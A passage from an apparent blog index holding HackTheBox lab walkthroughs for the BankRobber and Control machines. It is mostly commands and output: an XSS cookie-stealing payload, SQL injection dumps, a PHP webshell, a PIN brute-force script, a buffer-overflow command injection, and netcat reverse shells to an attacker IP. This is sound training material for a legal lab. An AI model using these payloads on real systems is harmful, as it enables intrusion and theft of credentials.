http://10.10.10.154/user/] /admin (Status: 301) [Size: 336] [--\u0026gt; http://10.10.10.154/admin/] /link.php (Status: 200) [Size: 0] /css (Status: 301) [Size: 334] [--\u0026gt; http://10.10.10.154/css/] /Index.php (Status: 200) [Size: 8245] /Login.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /js (Status: 301) [Size: 333] [--\u0026gt; http://10.10.10.154/js/] /examples (Status: 503) [Size: 1058] /notes.txt (Status: 200) [Size: 133] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php?msg=Succesfully logged out] /licenses (Status: 403) [Size: 1203] /Register.php (Status: 200) [Size: 0] /fonts (Status: 301) [Size: 336] [--\u0026gt; http://10.10.10.154/fonts/] Foothold/User http://10.10.10.154/notes.txt - Move all files from the default Xampp folder: TODO - Encode comments for every IP address except localhost: Done - Take a break.. Let\u0026rsquo;s register a user Looks like cookies are username and password We can try transfering the coins But as soon as we try to do that we have a pop up message, stating that admin will review the transaction Based on the message above, admin reviews the transaction Maybe we could perform XSS attack Both amount and id fields are numeric Let\u0026rsquo;s send the payload via comment field https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection \u0026lt;img src=\u0026quot;http://10.10.16.9/test\u0026quot;\u0026gt; Let\u0026rsquo;s send a payload to steal the admin cookies https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md \u0026lt;img src=x onerror=this.src=\u0026quot;http://10.10.16.9/?cookie=\u0026quot;+document.cookie;\u0026gt; username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D admin:Hopelessromantic Now we login as admin Let\u0026rsquo;s play with Search and Backdoorchecker Backdoorchecker issues error that it handles only localhost requests Search seems like vulnerable to SQL injections And it\u0026rsquo;s true Let\u0026rsquo;s dump the database ' UNION SELECT 1,2,3 -- - ' UNION SELECT schema_name,2,3 FROM information_schema.schemata-- - ' UNION SELECT table_schema,table_name,3 FROM information_schema.tables -- - ' UNION SELECT concat(table_schema,':',table_name ),column_name,3 FROM information_schema.columns -- - ' UNION SELECT user,password,3 FROM mysql.user -- - The hash is not crackable We can try stealing NTLM hash ' UNION SELECT LOAD_FILE('\\\\\\\\10.10.16.9\\\\test'),2,3 -- - But it\u0026rsquo;s not crackable too Let\u0026rsquo;s try reading files from the host We know from the note, that all files are in default xampp folder https://tonyfrenzy.medium.com/xampp-serving-from-any-directory-outside-of-htdocs-22a93f1b8815 Based on that let\u0026rsquo;s try reading backdoorcheck.php ' UNION SELECT LOAD_FILE('c:\\\\xampp\\\\htdocs\\\\admin\\\\backdoorchecker.php'),2,3 -- - \u0026lt;?php include(\u0026#39;../link.php\u0026#39;); include(\u0026#39;auth.php\u0026#39;); $username = base64_decode(urldecode($_COOKIE[\u0026#39;username\u0026#39;])); $password = base64_decode(urldecode($_COOKIE[\u0026#39;password\u0026#39;])); $bad = array(\u0026#39;$(\u0026#39;,\u0026#39;\u0026amp;\u0026#39;); $good = \u0026#34;ls\u0026#34;; if(strtolower(substr(PHP_OS,0,3)) == \u0026#34;win\u0026#34;){ $good = \u0026#34;dir\u0026#34;; } if($username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $password == \u0026#34;Hopelessromantic\u0026#34;){ if(isset($_POST[\u0026#39;cmd\u0026#39;])){ // FILTER ESCAPE CHARS foreach($bad as $char){ if(strpos($_POST[\u0026#39;cmd\u0026#39;],$char) !== false){ die(\u0026#34;You\u0026#39;re not allowed to do that.\u0026#34;); } } // CHECK IF THE FIRST 2 CHARS ARE LS if(substr($_POST[\u0026#39;cmd\u0026#39;], 0,strlen($good)) != $good){ die(\u0026#34;It\u0026#39;s only allowed to use the $good command\u0026#34;); } if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] == \u0026#34;::1\u0026#34;){ system($_POST[\u0026#39;cmd\u0026#39;]); } else{ echo \u0026#34;It\u0026#39;s only allowed to access this function from localhost (::1).\u0026lt;br\u0026gt; This is due to the recent hack attempts on our server.\u0026#34;; } } } else{ echo \u0026#34;You are not allowed to use this function!\u0026#34;; } ?\u0026gt; The first 3 chars should be dir We can\u0026rsquo;t use $( and \u0026amp; chars The request should be done from the localhost We can bypass the first 2 checks with dir| So we are left with the last check We can utilize XSS Create a js script and host it on server Deploy a listener var r = new XMLHttpRequest(); var cmd = \u0026#39;cmd=dir | powershell -c \u0026#34;iwr 10.10.16.9/nc64.exe -outfile \\\\programdata\\\\nc.exe\u0026#34;; \\\\programdata\\\\nc.exe 10.10.16.9 6666 -e cmd\u0026#39;; var url = \u0026#39;http://localhost/admin/backdoorchecker.php\u0026#39;; r.open(\u0026#39;POST\u0026#39;, url, true); r.setRequestHeader(\u0026#39;Content-type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;); r.send(cmd); Now we send a XSS payload just like before, but it points to our js script \u0026lt;script src=\u0026quot;http://10.10.16.9/rev.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; After few minutes, we get our shell Root whoami Everything in Dutch C:\\\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ===================================== ======== SeShutdownPrivilege Systeem afsluiten Disabled SeChangeNotifyPrivilege Controle op bladeren negeren Enabled SeUndockPrivilege Computer uit basisstation verwijderen Disabled SeIncreaseWorkingSetPrivilege Een proceswerkset vergroten Disabled SeTimeZonePrivilege Tijdzone wijzigen Disabled C:\\\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============ ================================================== Iedereen Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group INGEBOUWD\\Gebruikers Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\BATCH Well-known group S-1-5-3 Mandatory group, Enabled by default, Enabled group AANMELDEN OP DE CONSOLE Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Geverifieerde gebruikers Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Deze organisatie Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Lokaal account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOKAAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM-verificatie Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Verplicht niveau\\Gemiddeld verplicht niveau Label S-1-16-8192 We have a bankv2.exe file in C: Access Denied C:\\\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 3307-A1DE Directory of C:\\ 25-04-2019 16:50 57.937 bankv2.exe 24-04-2019 21:27 \u0026lt;DIR\u0026gt; PerfLogs 21-10-2022 10:32 \u0026lt;DIR\u0026gt; Program Files 21-10-2022 10:34 \u0026lt;DIR\u0026gt; Program Files (x86) 24-04-2019 15:52 \u0026lt;DIR\u0026gt; Users 11-01-2021 15:17 \u0026lt;DIR\u0026gt; Windows 24-04-2019 21:18 \u0026lt;DIR\u0026gt; xampp 1 File(s) 57.937 bytes 6 Dir(s) 5.197.508.608 bytes free C:\\\u0026gt;icacls bankv2.exe icacls bankv2.exe bankv2.exe: Toegang geweigerd. Successfully processed 0 files; Failed processing 1 files It\u0026rsquo;s currently running on port 910 C:\\\u0026gt;tasklist tasklist Image Name PID Session Name Session# Mem Usage ========================= ======== ================ =========== ============ ... bankv2.exe 1632 0 100 K ... C:\\\u0026gt;netstat -ano netstat -ano Active Connections ... TCP 0.0.0.0:910 0.0.0.0:0 LISTENING 1632 ... Let\u0026rsquo;s download chisel and create a tunnel └─$ ./chisel server -p 9001 --reverse 2023/10/03 18:03:11 server: Reverse tunnelling enabled 2023/10/03 18:03:11 server: Fingerprint HvsTMAj3j0sUjT7CkUkDfAhNbQg520kRgOKzSx8leuE= 2023/10/03 18:03:11 server: Listening on http://0.0.0.0:9001 PS C:\\ProgramData\u0026gt; .\\chisel.exe client 10.10.16.9:9001 R:9100:localhost:910 .\\chisel.exe client 10.10.16.9:9001 R:9100:localhost:910 To test we can nc to port 9100 on our attack box └─$ nc localhost 9100 -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio \u0026amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 4833 [!] Access denied, disconnecting client.... We can try bruteforcing the PIN from pwn import * for i in range(10000): pin = \u0026#34;0\u0026#34; * (4 - len(str(i))) + str(i) r = remote(\u0026#34;127.0.0.1\u0026#34;, 9100) r.recvuntil(\u0026#34;[$]\u0026#34;) r.sendline(pin) result = r.recvline() r.close() if b\u0026#34;[!] Access denied\u0026#34; not in result: print(\u0026#34;[+] PIN found =\u0026gt;\u0026#34;, pin) break Run the script It behaves the same despite entering the chars └─$ python3 brute-force-pin.py [+] PIN found =\u0026gt; 0021 After entering the pin, we have a new prompt asking for amount to transfer └─$ nc localhost 9100 -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio \u0026amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 0021 [$] PIN is correct, access granted! -------------------------------------------------------------- Please enter the amount of e-coins you would like to transfer: [$] 12 [$] Transfering $12 using our e-coin transfer application. [$] Executing e-coin transfer tool: C:\\Users\\admin\\Documents\\transfer.exe [$] Transaction in progress, you can safely disconnect... └─$ nc localhost 9100 -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio \u0026amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 0021 [$] PIN is correct, access granted! -------------------------------------------------------------- Please enter the amount of e-coins you would like to transfer: [$] AADAS [$] Transfering $AADAS using our e-coin transfer application. [$] Executing e-coin transfer tool: C:\\Users\\admin\\Documents\\transfer.exe [$] Transaction in progress, you can safely disconnect... It looks like we can overflow the buffer, since overwrote the name of the executable Note, the service will crash if we input too much As, I had to reboot the server └─$ nc localhost 9100 -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio \u0026amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 0021 [$] PIN is correct, access granted! -------------------------------------------------------------- Please enter the amount of e-coins you would like to transfer: [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application. [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [$] Transaction in progress, you can safely disconnect... Let\u0026rsquo;s find the offset First create the pattern Then send it to service └─$ msf-pattern_create -l 50 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab └─$ nc localhost 9100 -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio \u0026amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 0021 [$] PIN is correct, access granted! -------------------------------------------------------------- Please enter the amount of e-coins you would like to transfer: [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab using our e-coin transfer application. [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab [$] Transaction in progress, you can safely disconnect... Then find the offset using msf-pattern_offset It\u0026rsquo;s 32 └─$ msf-pattern_offset -q 0Ab1 [*] Exact match at offset 32 Create a payload And send it └─$ python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*32 + \u0026#34;\\\\programdata\\\\nc.exe 10.10.16.9 7777 -e cmd\u0026#34;)\u0026#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\programdata\\nc.exe 10.10.16.9 7777 -e cmd └─$ nc localhost 9100 -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio \u0026amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 0021 [$] PIN is correct, access granted! -------------------------------------------------------------- Please enter the amount of e-coins you would like to transfer: [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\programdata\\nc.exe 10.10.16.9 7777 -e cmd [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\programdata\\nc.exe 10.10.16.9 7777 -e cmd using our e-coin transfer application. [$] Executing e-coin transfer tool: \\programdata\\nc.exe 10.10.16.9 7777 -e cmd [$] Transaction in progress, you can safely disconnect... We got our shell ","date":"September 30, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bankrobber/images/bankrobber.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bankrobber/","summary":"BankRobber Enumeration nmap └─$ nmap -Pn -p- 10.10.10.154 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:23 BST Nmap scan report for 10.10.10.154 (10.10.10.154) Host is up (0.11s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql Nmap done: 1 IP address (1 host up) scanned in 28.12 seconds └─$ nmap -Pn -p80,443,445,3306 -sC -sV 10.","tags":["HTB","mysql","smb","cookies","xss","csrf","sqli","injection","overflow","chisel","python","pattern-create","phantom-js"],"title":"[HTB] Machine: BankRobber"},{"categories":null,"contents":"Control Enumeration nmap └─$ nmap -Pn -p- 10.10.10.167 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:22 BST Nmap scan report for 10.10.10.167 (10.10.10.167) Host is up (0.11s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 3306/tcp open mysql 49666/tcp open unknown 49667/tcp open unknown └─$ nmap -Pn -p80,135,3306 -sC -sV 10.10.10.167 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:23 BST Nmap scan report for 10.10.10.167 (10.10.10.167) Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Fidelity | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 3306/tcp open mysql? | fingerprint-strings: | NULL, SIPOptions: |_ Host \u0026#39;10.10.16.9\u0026#39; is not allowed to connect to this MariaDB server 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.94%I=7%D=9/30%Time=6518759C%P=x86_64-pc-linux-gnu%r(NU SF:LL,49,\u0026#34;E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.9\u0026#39;\\x20is\\x20not\\x20allowe SF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(SIPOptions,49 SF:,\u0026#34;E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.9\u0026#39;\\x20is\\x20not\\x20allowed\\x20 SF:to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds mysql └─$ mysql -h 10.10.10.167 ERROR 1130 (HY000): Host \u0026#39;10.10.16.9\u0026#39; is not allowed to connect to this MariaDB server Web Server\ngobuster\n└─$ gobuster dir -u http://10.10.10.167/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.167/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/09/30 20:24:57 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 3145] /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.167/images/] /about.php (Status: 200) [Size: 7867] /uploads (Status: 301) [Size: 151] [--\u0026gt; http://10.10.10.167/uploads/] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.167/Images/] /admin.php (Status: 200) [Size: 89] /assets (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.167/assets/] /About.php (Status: 200) [Size: 7867] /Index.php (Status: 200) [Size: 3145] /database.php (Status: 200) [Size: 0] Foothold We have comments in the web page source If we visit admin.php we receive Access Denied: Header Missing. Please ensure you go through the proxy to access this page We would probably have to fuzz the headers Let\u0026rsquo;s use wfuzz for that List of possible headers: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers └─$ wfuzz -u http://10.10.10.167/admin.php -w headers -H \u0026#39;FUZZ: test\u0026#39; --hh 89 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.167/admin.php Total requests: 162 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000032: 400 6 L 34 W 374 Ch \u0026#34;Content-Length\u0026#34; 000000029: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000004: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000073: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000054: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000137: 501 6 L 26 W 343 Ch \u0026#34;Transfer-Encoding\u0026#34; 000000150: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000144: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; Total time: 2.707290 Processed Requests: 162 Filtered Requests: 154 Requests/sec.: 59.83842 Nothing special, but remembering the hint we saw about the proxy, I set it to box ip └─$ wfuzz -u http://10.10.10.167/admin.php -w headers -H \u0026#39;FUZZ: 10.10.10.167\u0026#39; --hh 89 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.167/admin.php Total requests: 162 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000029: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000032: 400 6 L 34 W 374 Ch \u0026#34;Content-Length\u0026#34; 000000004: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000073: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000054: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000150: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000144: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000137: 501 6 L 26 W 343 Ch \u0026#34;Transfer-Encoding\u0026#34; Total time: 2.680402 Processed Requests: 162 Filtered Requests: 154 Requests/sec.: 60.43868 Nothing again, but then I tried 192.168.4.28, which we saw in comments We received a new header: X-Forwarded-For, which return 7933 chars └─$ wfuzz -u http://10.10.10.167/admin.php -w headers -H \u0026#39;FUZZ: 192.168.4.28\u0026#39; --hh 89 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.167/admin.php Total requests: 162 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000032: 400 6 L 34 W 374 Ch \u0026#34;Content-Length\u0026#34; 000000029: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000004: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000073: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000054: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000137: 501 6 L 26 W 343 Ch \u0026#34;Transfer-Encoding\u0026#34; 000000155: 200 153 L 466 W 7933 Ch \u0026#34;X-Forwarded-For\u0026#34; 000000150: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; 000000144: 400 6 L 28 W 339 Ch \u0026#34;Non-standard Deprecated\u0026#34; Total time: 0 Processed Requests: 162 Filtered Requests: 153 Requests/sec.: 0 I installed Modify Header Value to Firefox And now we see the page Playing around with the search panel resulted in successful SQL injection Let\u0026rsquo;s find the number of columns It\u0026rsquo;s 6 Dump the databases\nproductName=' union select 1,schema_name,3,4,5,6 from information_schema.schemata-- - Dump warehouse daatabase\nproductName=' union select table_schema,table_name,3,4,5,6 from information_schema.tables where table_schema='warehouse'-- - Nothing interesting Let\u0026rsquo;s check mysql database productName=' union select host,user,password,4,5,6 from mysql.user-- - We can start cracking hashes in the background Let\u0026rsquo;s also check privileges We are manager user productName=' union select grantee,privilege_type,is_grantable,4,5,6 from information_schema.user_privileges-- - manager has file privileges Let\u0026rsquo;s try creating a webshell https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#mysql-commands productName=' union select '\u0026lt;?php system($_GET[\\'cmd\\']); ?\u0026gt;',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/shell.php'-- - First run returns an error, but second run says that the file exists And it works └─$ curl -s http://10.10.10.167/shell.php?cmd=whoami nt authority\\iusr 2 3 4 5 6 Let\u0026rsquo;s get reverse shell └─$ curl -s \u0026#39;http://10.10.10.167/shell.php?cmd=powershell+wget+10.10.16.9/nc64.exe+-outfile+\\programdata\\nc.exe\u0026#39; 2 3 4 5 6 └─$ curl -s \u0026#39;http://10.10.10.167/shell.php?cmd=dir+\\programdata\u0026#39; Volume in drive C has no label. Volume Serial Number is DC9E-2AFB Directory of C:\\programdata 11/01/2019 04:58 PM \u0026lt;DIR\u0026gt; Microsoft Visual Studio 10/01/2023 05:26 PM 45,272 nc.exe 10/24/2019 06:00 PM \u0026lt;DIR\u0026gt; Package Cache 10/01/2023 05:17 PM \u0026lt;DIR\u0026gt; regid.1991-06.com.microsoft 09/15/2018 10:19 AM \u0026lt;DIR\u0026gt; SoftwareDistribution 10/21/2019 05:31 PM \u0026lt;DIR\u0026gt; USOPrivate 10/21/2019 05:31 PM \u0026lt;DIR\u0026gt; USOShared 10/21/2019 05:30 PM \u0026lt;DIR\u0026gt; VMware 1 File(s) 45,272 bytes 7 Dir(s) 14,795,485,184 bytes free 2 3 4 5 6 └─$ curl -s \u0026#39;http://10.10.10.167/shell.php?cmd=\\programdata\\nc.exe+10.10.16.9+6666+-e+cmd\u0026#39; User Enumerate C:\\inetpub\\wwwroot\u0026gt;dir \\users dir \\users Volume in drive C has no label. Volume Serial Number is DC9E-2AFB Directory of C:\\users 11/05/2019 03:34 PM \u0026lt;DIR\u0026gt; . 11/05/2019 03:34 PM \u0026lt;DIR\u0026gt; .. 10/01/2023 02:44 PM \u0026lt;DIR\u0026gt; Administrator 11/01/2019 12:09 PM \u0026lt;DIR\u0026gt; Hector 10/21/2019 05:29 PM \u0026lt;DIR\u0026gt; Public 0 File(s) 0 bytes 5 Dir(s) 14,795,485,184 bytes free C:\\inetpub\\wwwroot\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Mandatory Label\\High Mandatory Level Label S-1-16-12288 Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\IIS_IUSRS Alias S-1-5-32-568 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Group used for deny only CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group hector user He\u0026rsquo;s a member of Remote Management Use*Users C:\\inetpub\\wwwroot\u0026gt;net user hector net user hector User name Hector Full Name Hector Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 11/1/2019 12:27:50 PM Password expires Never Password changeable 11/1/2019 12:27:50 PM Password required Yes User may change password No Workstations allowed All Logon script User profile Home directory Last logon 10/1/2023 2:44:24 PM Logon hours allowed All Local Group Memberships *Remote Management Use*Users Global Group memberships *None The command completed successfully. The port 5985 is listening But not available from outside C:\\inetpub\\wwwroot\u0026gt;netstat -ano netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 812 TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING 1952 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 452 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 348 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 964 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 1764 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 584 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 604 TCP 10.10.10.167:80 10.10.16.9:48872 ESTABLISHED 4 TCP 10.10.10.167:49700 10.10.16.9:6666 ESTABLISHED 3480 TCP [::]:80 [::]:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 812 TCP [::]:3306 [::]:0 LISTENING 1952 TCP [::]:5985 [::]:0 LISTENING 4 TCP [::]:47001 [::]:0 LISTENING 4 TCP [::]:49664 [::]:0 LISTENING 452 TCP [::]:49665 [::]:0 LISTENING 348 TCP [::]:49666 [::]:0 LISTENING 964 TCP [::]:49667 [::]:0 LISTENING 1764 TCP [::]:49668 [::]:0 LISTENING 584 TCP [::]:49669 [::]:0 LISTENING 604 UDP 0.0.0.0:123 *:* 1936 UDP 0.0.0.0:5353 *:* 1168 UDP 0.0.0.0:5355 *:* 1168 UDP 127.0.0.1:51867 *:* 964 UDP [::]:123 *:* 1936 UDP [::]:5353 *:* 1168 UDP [::]:5355 *:* 1168 Let\u0026rsquo;s check the results from hashcat hector:0E178792E8FC304A2E3133D535D38CAF1DA3CD9D manager:CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA root:0A4A5CAD344718DC418035A1F4D292BA603134D8 └─$ hashcat -m 300 hash /usr/share/wordlists/rockyou.txt --user hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU ... * Keyspace..: 14344385 0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector Approaching final keyspace - workload adjusted. ... We have a potential password Let\u0026rsquo;s try running commands as hector And it works PS C:\\inetpub\\wwwroot\u0026gt; $env:ComputerName $env:ComputerName CONTROL PS C:\\inetpub\\wwwroot\u0026gt; $user = \u0026#34;CONTROL\\hector\u0026#34; $user = \u0026#34;CONTROL\\hector\u0026#34; PS C:\\inetpub\\wwwroot\u0026gt; $pass = ConvertTo-SecureString \u0026#34;l33th4x0rhector\u0026#34; -AsPlainText -Force $pass = ConvertTo-SecureString \u0026#34;l33th4x0rhector\u0026#34; -AsPlainText -Force PS C:\\inetpub\\wwwroot\u0026gt; $cred = New-Object System.Management.Automation.PSCredential($user, $pass) $cred = New-Object System.Management.Automation.PSCredential($user, $pass) PS C:\\inetpub\\wwwroot\u0026gt; Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami } Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami } control\\hector PS C:\\inetpub\\wwwroot\u0026gt; Let\u0026rsquo;s get a reverse shell PS C:\\inetpub\\wwwroot\u0026gt; Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { \\programdata\\nc.exe 10.10.16.9 7777 -e cmd } Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { \\programdata\\nc.exe 10.10.16.9 7777 -e cmd } Root 